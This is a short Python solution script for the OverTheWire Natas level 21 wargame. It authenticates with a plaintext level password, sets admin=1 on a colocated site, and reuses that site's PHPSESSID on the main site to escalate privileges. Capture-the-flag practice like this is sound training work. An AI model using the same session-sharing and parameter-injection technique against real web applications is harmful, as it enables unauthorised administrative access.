#!/usr/bin/env python3
import requests

auth_user = 'natas21'
auth_pass = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

# POST request on colocated website
r = requests.post(
	'http://natas21-experimenter.natas.labs.overthewire.org',
	auth=(auth_user, auth_pass),
	data={'admin':'1','submit':'Update'}
	)

phpsessid = r.cookies['PHPSESSID']
print("PHPSESSID = %s\n" % phpsessid)

# Now on the main website
r = requests.post(
	'http://natas21.natas.labs.overthewire.org',
	auth=(auth_user, auth_pass),
	cookies={'PHPSESSID':phpsessid}
	)

print(r.text)